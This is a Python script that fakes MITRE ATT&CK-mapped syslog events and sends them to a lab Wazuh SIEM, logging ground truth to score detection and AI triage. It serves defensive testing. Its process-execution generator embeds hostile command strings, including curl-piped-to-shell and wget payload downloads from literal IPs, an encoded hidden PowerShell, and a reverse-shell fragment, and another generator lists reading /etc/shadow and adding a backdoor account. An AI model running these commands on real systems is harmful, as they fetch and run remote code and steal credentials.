#!/usr/bin/env python3
"""
Syslog Spoofer for Testing Lab
==========================================
Simulates multiple endpoint devices 
Target: 192.168.64.129:514 (UDP)
"""

import socket
import random
import time
import datetime
import argparse
import csv
import os
import uuid

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

WAZUH_MANAGER_IP = "192.168.64.129"
WAZUH_MANAGER_PORT = 514

# Simulated endpoint devices: hostname -> IP address
DEVICES = {
    "WIN-DC01":       "192.168.64.10",
    "WIN-FILESRV01":  "192.168.64.11",
    "LNX-WEB01":      "192.168.64.12",
    "LNX-DB01":       "192.168.64.13",
    "WKSTN-FIN01":    "192.168.64.20",
    "WKSTN-HR02":     "192.168.64.21",
    "WKSTN-IT03":     "192.168.64.22",
    "LNX-JUMPHOST":   "192.168.64.30",
    "WIN-APPSRV02":   "192.168.64.14",
    "WKSTN-DEV04":    "192.168.64.23",
    "LNX-MAIL01":     "192.168.64.15",
    "WKSTN-SALES05":  "192.168.64.24",
}

USERS = ["admin", "administrator", "root", "jsmith", "mjones", "svc_backup",
         "guest", "helpdesk", "dba_oracle", "finance_user"]

ATTACKER_IPS = ["45.142.122.18", "185.220.101.45", "194.61.24.102",
                "103.45.77.201", "91.219.236.18", "37.49.230.12"]

# Ports a real recon scan would sweep, used by T1046.
SCAN_TARGET_PORTS = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445,
                     993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 5985,
                     6379, 8080, 8443, 27017]

# Delay between packets inside a multi-packet burst.
BURST_PACKET_DELAY = 0.15

# ---------------------------------------------------------------------------
# Balanced experiment mode configuration
# ---------------------------------------------------------------------------
ATTACKS_PER_TECHNIQUE = 30

# Failures per T1110 burst; 12 reliably clears rule 5712's threshold of 8.
T1110_FAILURES_PER_BURST = 12

# Seconds between the END of one attack instance and the START of the next.
EXPERIMENT_GAP_SECONDS = 15.0

# Syslog facility/severity -> PRI value (RFC 3164)
PRI_AUTH_NOTICE = 37
PRI_AUTH_CRIT   = 34
PRI_USER_INFO   = 14
PRI_USER_WARN   = 12

# ---------------------------------------------------------------------------
# MITRE ATT&CK mapped log message generators
# ---------------------------------------------------------------------------

def t1110_ssh_bruteforce(hostname, attacker_ip=None):
    """T1110 - Brute Force (SSH)

    attacker_ip: if provided, pins the source IP (used by run_simulation to
    keep a single attacker IP for an entire T1110 session, since Wazuh rule
    5712 requires 8 failures from the SAME source IP within 120s — a fresh
    random IP per message would never satisfy that threshold).

    Message format matters here. Wazuh's brute-force chain is:

        5700  sshd decoder parent
          └── 5710  matches the literal text "invalid user" (or "illegal user")
                └── 5712  frequency=8, timeframe=120, same_source_ip

    5712 only counts events that already matched 5710, so a failure line
    without the phrase "invalid user" is decoded, alerts as an ordinary
    authentication failure, and is never counted toward the brute-force
    threshold — no matter how many are sent. The failed-login line therefore
    uses the full OpenSSH wording:

        Failed password for invalid user <user> from <ip> port <port> ssh2

    The PID is carried in the syslog TAG ("sshd[1234]") rather than the
    message body, which is where real OpenSSH puts it and what the built-in
    Wazuh sshd decoder expects.
    """
    attacker = attacker_ip or random.choice(ATTACKER_IPS)
    user = random.choice(USERS)
    port = random.randint(40000, 65000)
    pid  = random.randint(1000, 32000)
    success = random.random() < 0.08  # occasional successful login
    if success:
        # A successful login is not an invalid user, so the phrase is omitted.
        # line deliberately omits the phrase and does not feed rule 5710.
        msg = (f"Accepted password for {user} from {attacker} port {port} ssh2")
    else:
        msg = (f"Failed password for invalid user {user} "
               f"from {attacker} port {port} ssh2")
    pri = PRI_AUTH_NOTICE
    tag = f"sshd[{pid}]"
    return pri, tag, msg


def t1078_privilege_escalation(hostname):
    """T1078 - Valid Accounts (Privilege Escalation)"""
    user = random.choice(USERS)
    target_user = "root"
    tty = f"pts/{random.randint(0,4)}"
    pwd = random.choice(["/home/" + user, "/var/www", "/opt/app", "/tmp"])
    cmd = random.choice(["/usr/bin/passwd root", "/bin/bash", "/usr/bin/cat /etc/shadow",
                          "/usr/sbin/useradd backdoor_admin", "/usr/bin/usermod -aG sudo " + user])
    msg = (f"{user} : TTY={tty} ; PWD={pwd} ; USER={target_user} ; COMMAND={cmd}")
    return PRI_AUTH_CRIT, "sudo", msg


def t1046_port_scan(hostname, attacker_ip=None, num_ports=None):
    """T1046 - Network Service Discovery (Port Scan)

    Emits ONE raw netfilter/iptables-style connection-attempt line per port
    probed — same SRC, same DST, distinct DPT — in the authentic kernel log
    format (LEN/TOS/PREC/TTL/ID/WINDOW/RES/SYN/URGP, TCP flags as bare tokens).

    Deliberately contains NO narration such as "scan detected" or "ports
    probed": a real kernel logs each packet individually and never labels the
    activity as a scan. "This is a scan" must be inferred by the SIEM from the
    volume/spread of these lines (Wazuh rule 100203 correlates them), not
    string-matched from a phrase the generator wrote in.

    Returns a LIST of (pri, tag, content) tuples — one per probed port.
    """
    attacker = attacker_ip or random.choice(ATTACKER_IPS)
    dst      = DEVICES[hostname]
    iface    = random.choice(["ens33", "eth0"])
    n        = num_ports if num_ports is not None else random.randint(10, 16)
    ports    = random.sample(SCAN_TARGET_PORTS, min(n, len(SCAN_TARGET_PORTS)))

    # netfilter MAC field = dst MAC + src MAC + ethertype (14 bytes hex)
    mac = "00:0c:29:%02x:%02x:%02x:00:50:56:c0:00:08:08:00" % (
        random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

    events = []
    for dport in ports:
        line = (f"IN={iface} OUT= MAC={mac} "
                f"SRC={attacker} DST={dst} "
                f"LEN=44 TOS=0x00 PREC=0x00 TTL={random.randint(45, 64)} "
                f"ID={random.randint(1, 65535)} PROTO=TCP "
                f"SPT={random.randint(1024, 65000)} DPT={dport} "
                f"WINDOW=1024 RES=0x00 SYN URGP=0")
        events.append((PRI_USER_WARN, "kernel", line))
    return events


def t1059_suspicious_process(hostname):
    """T1059 - Command and Scripting Interpreter"""
    user = random.choice(USERS)
    procs = [
        "powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcA...",
        "/bin/bash -c \"curl -s http://45.142.122.18/payload.sh | sh\"",
        "cmd.exe /c whoami /all",
        "python3 -c \"import socket,subprocess,os;...\"",
        "/usr/bin/wget http://194.61.24.102/x86_64 -O /tmp/.update",
        "powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Public\\update.ps1",
    ]
    proc = random.choice(procs)
    pid = random.randint(1000, 32000)
    msg = (f"Process Create: User={user} PID={pid} CommandLine=\"{proc}\"")
    return PRI_USER_WARN, "auditd", msg


def t1021_lateral_movement(hostname):
    """T1021 - Remote Services (Lateral Movement)"""
    user = random.choice(USERS)
    other_hosts = [h for h in DEVICES if h != hostname]
    target_host = random.choice(other_hosts)
    target_ip = DEVICES[target_host]
    method = random.choice(["RDP (3389)", "SMB (445)", "WinRM (5985)", "SSH (22)"])
    msg = (f"Remote login session established: user={user} src_host={hostname} "
           f"src_ip={DEVICES[hostname]} dst_host={target_host} dst_ip={target_ip} "
           f"method={method}")
    return PRI_AUTH_NOTICE, "security", msg


ATTACK_GENERATORS = {
    "T1110": t1110_ssh_bruteforce,
    "T1078": t1078_privilege_escalation,
    "T1046": t1046_port_scan,
    "T1059": t1059_suspicious_process,
    "T1021": t1021_lateral_movement,
}

# ---------------------------------------------------------------------------
# Syslog message construction (RFC 3164)
# ---------------------------------------------------------------------------

def build_syslog_message(pri, hostname, tag, content, now=None, evid=None):
    """
    Build an RFC3164-compliant syslog message:
    <PRI>TIMESTAMP HOSTNAME TAG: CONTENT [msgid=EVID]

    now: optional datetime to use instead of datetime.datetime.now(), so the
    caller can reuse the exact same timestamp for the ground-truth log row.

    evid: optional experiment-tracking correlation ID appended to the content
    as " msgid=<hex>". This is the join key between the ground-truth CSV and
    the AI-scored output — without it, matching a scored alert back to the
    technique that produced it relies on fuzzy full_log string comparison.
    It is an opaque hex token (no technique information), it is stripped from
    the log before the AI/RAG ever sees it (see strip_event_id in the
    pipeline), and it does not affect any Wazuh decoder or rule match since it
    is appended after all parsed fields.
    """
    now = now or datetime.datetime.now()
    if evid:
        content = f"{content} msgid={evid}"
    timestamp = now.strftime("%b %d %H:%M:%S")
    # Fix day-of-month padding (syslog uses space-padded single digits)
    day = now.day
    timestamp = timestamp.replace(
        timestamp.split()[1], f"{day:2d}", 1
    )
    return f"<{pri}>{timestamp} {hostname} {tag}: {content}"


# ---------------------------------------------------------------------------
# Sender
# ---------------------------------------------------------------------------

def send_syslog(sock, message, manager_ip, manager_port):
    sock.sendto(message.encode("utf-8"), (manager_ip, manager_port))


# ---------------------------------------------------------------------------
# Ground-truth logging
# ---------------------------------------------------------------------------

GROUND_TRUTH_FIELDS = ["sent_index", "event_id", "timestamp_iso", "technique",
                        "hostname", "device_ip", "tag", "message"]


def init_ground_truth_log(path):
    """Create the ground-truth CSV with a header if it doesn't exist yet."""
    is_new = not os.path.exists(path) or os.path.getsize(path) == 0
    if is_new:
        with open(path, "w", newline="", encoding="utf-8") as f:
            csv.writer(f).writerow(GROUND_TRUTH_FIELDS)


def log_ground_truth(path, sent_index, event_id, now, technique, hostname, tag, message):
    with open(path, "a", newline="", encoding="utf-8") as f:
        csv.writer(f).writerow([
            sent_index, event_id, now.isoformat(), technique, hostname,
            DEVICES.get(hostname, ""), tag, message,
        ])


TECHNIQUE_NAMES = {
    "T1110": "brute force",
    "T1078": "valid accounts",
    "T1046": "port scanning",
    "T1059": "command execution",
    "T1021": "remote services",
}


def build_attack_instance(technique, hostname, attacker_ip=None):
    """Return the full list of (pri, tag, content) events for ONE attack.

    The per-technique generator functions are used exactly as they are; this
    only decides how many times each is called so that the resulting burst is
    large enough to satisfy the Wazuh correlation rule for that technique.
    """
    generator = ATTACK_GENERATORS[technique]

    if technique == "T1110":
        # Loop the single-line generator into a burst with one pinned source IP.
        # for the whole burst so rule 5712's "same srcip" condition holds.
        return [generator(hostname, attacker_ip=attacker_ip)
                for _ in range(T1110_FAILURES_PER_BURST)]

    if technique == "T1046":
        # Already returns a list of one line per probed port.
        return list(generator(hostname, attacker_ip=attacker_ip))

    return [generator(hostname)]


def run_experiment(manager_ip, manager_port, scenarios, per_technique,
                    gap_seconds, verbose=True, ground_truth_log=None,
                    pin_t1110_ip=False, seed=None):
    """Balanced, shuffled experiment run.

    Sends `per_technique` complete attack instances for each technique in
    `scenarios`, interleaved in random order, with `gap_seconds` between
    instances. Randomising the order removes order effects: if every brute
    force ran first and every port scan last, any drift in model or SIEM
    behaviour over the run would be confounded with technique.
    """
    if seed is not None:
        random.seed(seed)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    hostnames = list(DEVICES.keys())

    # Build the balanced schedule, then shuffle it.
    schedule = []
    for technique in scenarios:
        schedule.extend([technique] * per_technique)
    random.shuffle(schedule)
    total = len(schedule)

    # T1110 source IP strategy: a fresh IP per burst by default.
    session_t1110_ip = random.choice(ATTACKER_IPS) if pin_t1110_ip else None

    if ground_truth_log:
        init_ground_truth_log(ground_truth_log)

    est_min = (total * gap_seconds
               + total * T1110_FAILURES_PER_BURST * BURST_PACKET_DELAY) / 60.0

    print("=" * 70)
    print("  BALANCED EXPERIMENT RUN")
    print("=" * 70)
    print(f"[*] Target             : {manager_ip}:{manager_port}")
    print(f"[*] Techniques         : {', '.join(scenarios)}")
    print(f"[*] Instances each     : {per_technique}  (total {total})")
    print(f"[*] Order              : shuffled" + (f" (seed {seed})" if seed is not None else ""))
    print(f"[*] Gap between attacks: {gap_seconds}s")
    print(f"[*] T1110 source IP    : "
          f"{'pinned ' + session_t1110_ip if session_t1110_ip else 'fresh per burst'}")
    print(f"[*] Ground truth log   : {ground_truth_log or 'disabled'}")
    print(f"[*] Estimated runtime  : ~{est_min:.0f} min")
    print("-" * 70)

    sent = 0
    completed = 0
    per_tech_count = {t: 0 for t in scenarios}
    last_t1110_ip = None

    try:
        for i, technique in enumerate(schedule, start=1):
            hostname = random.choice(hostnames)

            attacker_ip = None
            if technique == "T1110":
                if session_t1110_ip:
                    attacker_ip = session_t1110_ip
                else:
                    # Never reuse the previous burst's IP, or rule 5712 merges the two bursts.
                    choices = [ip for ip in ATTACKER_IPS if ip != last_t1110_ip]
                    attacker_ip = random.choice(choices or ATTACKER_IPS)
                    last_t1110_ip = attacker_ip
            elif technique == "T1046":
                attacker_ip = random.choice(ATTACKER_IPS)

            events = build_attack_instance(technique, hostname, attacker_ip)
            per_tech_count[technique] += 1

            print(f"[{i}/{total}] {technique} ({TECHNIQUE_NAMES.get(technique, '')}) "
                  f"-> {hostname}  [{len(events)} log line"
                  f"{'s' if len(events) != 1 else ''}]"
                  + (f"  src={attacker_ip}" if attacker_ip else ""))

            # Emit the whole burst tightly so it lands inside the correlation window.
            # window, THEN wait. The gap is between attacks, never inside one.
            for idx, (pri, tag, content) in enumerate(events):
                now     = datetime.datetime.now()
                evid    = uuid.uuid4().hex[:12]
                message = build_syslog_message(pri, hostname, tag, content,
                                               now=now, evid=evid)
                send_syslog(sock, message, manager_ip, manager_port)
                sent += 1

                if ground_truth_log:
                    log_ground_truth(ground_truth_log, sent, evid, now,
                                     technique, hostname, tag, message)

                if verbose:
                    print(f"      {message}")

                if idx < len(events) - 1:
                    time.sleep(BURST_PACKET_DELAY)

            completed += 1

            if i < total:
                time.sleep(gap_seconds)

    except KeyboardInterrupt:
        print("\n[*] Stopped by user.")
    finally:
        sock.close()
        print("-" * 70)
        print(f"[*] Attack instances completed: {completed}/{total}")
        print(f"[*] Total log lines sent      : {sent}")
        for t in scenarios:
            print(f"      {t}: {per_tech_count[t]} instances")


def run_simulation(manager_ip, manager_port, interval, count, scenarios,
                    verbose=True, ground_truth_log=None):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    hostnames = list(DEVICES.keys())
    sent = 0

    # Pin a single attacker IP for the whole session if T1110 is in scope.
    t1110_attacker_ip = None
    if "T1110" in scenarios:
        t1110_attacker_ip = random.choice(ATTACKER_IPS)

    if ground_truth_log:
        init_ground_truth_log(ground_truth_log)

    print(f"[*] Sending spoofed syslog messages to {manager_ip}:{manager_port}")
    print(f"[*] Simulated devices: {len(hostnames)}")
    print(f"[*] Attack scenarios enabled: {', '.join(scenarios)}")
    print(f"[*] Interval: {interval}s | Count: {'infinite' if count == 0 else count}")
    if t1110_attacker_ip:
        print(f"[*] T1110 attacker IP pinned for this session: {t1110_attacker_ip}")
    if ground_truth_log:
        print(f"[*] Ground truth log: {ground_truth_log}")
    print("-" * 70)

    try:
        while count == 0 or sent < count:
            hostname = random.choice(hostnames)
            technique = random.choice(scenarios)
            generator = ATTACK_GENERATORS[technique]

            if technique == "T1110":
                result = generator(hostname, attacker_ip=t1110_attacker_ip)
            else:
                result = generator(hostname)

            # Generators return one (pri, tag, content) tuple or a list of them.
            # LIST of them (e.g. T1046 emits one packet line per probed port).
            if result and isinstance(result[0], (tuple, list)):
                events = list(result)
            else:
                events = [result]

            for idx, (pri, tag, content) in enumerate(events):
                now     = datetime.datetime.now()
                evid    = uuid.uuid4().hex[:12]
                message = build_syslog_message(pri, hostname, tag, content,
                                               now=now, evid=evid)

                send_syslog(sock, message, manager_ip, manager_port)
                sent += 1

                if ground_truth_log:
                    log_ground_truth(ground_truth_log, sent, evid, now,
                                     technique, hostname, tag, message)

                if verbose:
                    print(f"[{sent}] {message}")

                # Space packets tightly so the burst falls inside the correlation window.
                # within the SIEM correlation window; full interval after it.
                if idx < len(events) - 1:
                    time.sleep(BURST_PACKET_DELAY)

                if count and sent >= count:
                    break

            time.sleep(interval)
    except KeyboardInterrupt:
        print("\n[*] Stopped by user.")
    finally:
        sock.close()
        print(f"[*] Total messages sent: {sent}")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="Syslog spoofer for SIEM/Wazuh testing - simulates MITRE ATT&CK-mapped attack logs."
    )
    parser.add_argument("--ip", default=WAZUH_MANAGER_IP,
                         help=f"Wazuh manager IP (default: {WAZUH_MANAGER_IP})")
    parser.add_argument("--port", type=int, default=WAZUH_MANAGER_PORT,
                         help=f"Wazuh manager syslog UDP port (default: {WAZUH_MANAGER_PORT})")
    parser.add_argument("--interval", type=float, default=2.0,
                         help="Seconds between messages (default: 2.0)")
    parser.add_argument("--count", type=int, default=0,
                         help="Number of messages to send (0 = infinite, default: 0)")
    parser.add_argument("--techniques", nargs="+",
                         default=list(ATTACK_GENERATORS.keys()),
                         choices=list(ATTACK_GENERATORS.keys()),
                         help="MITRE ATT&CK technique IDs to simulate "
                              "(default: all - T1110 T1078 T1046 T1059 T1021)")
    parser.add_argument("--quiet", action="store_true",
                         help="Suppress per-message console output")
    parser.add_argument("--ground-truth-log", default="ground_truth_log.csv",
                         help="CSV file to record the true technique per sent "
                              "message, for later scoring against Wazuh/AI "
                              "output (default: ground_truth_log.csv)")
    parser.add_argument("--no-ground-truth-log", action="store_true",
                         help="Disable ground-truth logging entirely")

    # --- balanced experiment mode ---
    parser.add_argument("--experiment", action="store_true",
                         help="Balanced experiment run: N complete attack "
                              "instances per technique, shuffled into random "
                              "order, with a gap between each. Ignores "
                              "--count and --interval.")
    parser.add_argument("--per-technique", type=int, default=ATTACKS_PER_TECHNIQUE,
                         help=f"Attack instances per technique in --experiment "
                              f"mode (default: {ATTACKS_PER_TECHNIQUE})")
    parser.add_argument("--gap", type=float, default=EXPERIMENT_GAP_SECONDS,
                         help=f"Seconds between attack instances in "
                              f"--experiment mode (default: {EXPERIMENT_GAP_SECONDS})")
    parser.add_argument("--pin-t1110-ip", action="store_true",
                         help="Use ONE attacker IP for every T1110 burst. Off "
                              "by default: with a short gap, a single IP lets "
                              "Wazuh merge consecutive bursts inside rule "
                              "5712's 120s window.")
    parser.add_argument("--seed", type=int, default=None,
                         help="Seed the RNG so the attack order is reproducible")

    args = parser.parse_args()

    if args.experiment:
        run_experiment(
            manager_ip=args.ip,
            manager_port=args.port,
            scenarios=args.techniques,
            per_technique=args.per_technique,
            gap_seconds=args.gap,
            verbose=not args.quiet,
            ground_truth_log=None if args.no_ground_truth_log else args.ground_truth_log,
            pin_t1110_ip=args.pin_t1110_ip,
            seed=args.seed,
        )
        return

    run_simulation(
        manager_ip=args.ip,
        manager_port=args.port,
        interval=args.interval,
        count=args.count,
        scenarios=args.techniques,
        verbose=not args.quiet,
        ground_truth_log=None if args.no_ground_truth_log else args.ground_truth_log,
    )


if __name__ == "__main__":
    main()
